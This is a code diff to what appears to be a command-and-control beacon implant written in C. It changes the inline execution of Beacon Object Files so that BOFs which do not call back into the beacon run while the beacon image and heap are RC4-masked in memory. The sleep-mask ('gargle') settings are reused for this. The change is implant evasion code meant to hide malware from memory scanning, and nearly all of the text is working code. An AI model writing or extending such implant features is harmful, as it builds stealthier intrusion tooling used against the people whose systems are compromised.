@@ -15,6 +15,7 @@
 #include "bformat.h"
 #include "datastore.h"
 #include "gargleint.h"
+#include "sleepmask_bofwin.h"
 
 #define RELOC_ENDTABLE 0
 #define RELOC_ADDR64   1
@@ -461,6 +462,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	SIZE_T total;
 	OBJ_RELOC * reloc;
 	BOOL success = FALSE;
+	BOOL beacon_api_used = FALSE; /* Phase 3: any ftable reloc means the BOF
+	                               * can call back into beacon .text - such a
+	                               * BOF may never run inside the masked
+	                               * window (13.11) */
 	int how = 0;
 
 	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
@@ -586,6 +591,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				break;
 		}
 		else if (reloc->symbol >= 0 && reloc->symbol < 1024) {
+			beacon_api_used = TRUE;
 			if (!process_reloc(reloc, src, dst, (char *)ftable + (reloc->symbol * sizeof(char *)), 0, base))
 				break;
 		}
@@ -662,7 +668,22 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
-				inlinefunc(args, alen);
+				/* Phase 3 masked BOF window (13.11): a Win32-only BOF (no
+				 * ftable relocations) runs with the full beacon image +
+				 * tracked heap RC4-masked. Lazy gparms init mirrors
+				 * gen3_sleep; the nook setting is the same mask switch the
+				 * sleep path honours. Any decline (engine, threads,
+				 * watchdog) falls back to the plain unmasked call. */
+				if (!beacon_api_used && conv == 0 &&
+				    setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
+					if (gparms == NULL)
+						gargle_setup_parms(NULL, NULL, 0);
+					if (!bofwin_window(inlinefunc, args, alen, 0))
+						inlinefunc(args, alen);
+				}
+				else {
+					inlinefunc(args, alen);
+				}
 			}
 		}
 	}
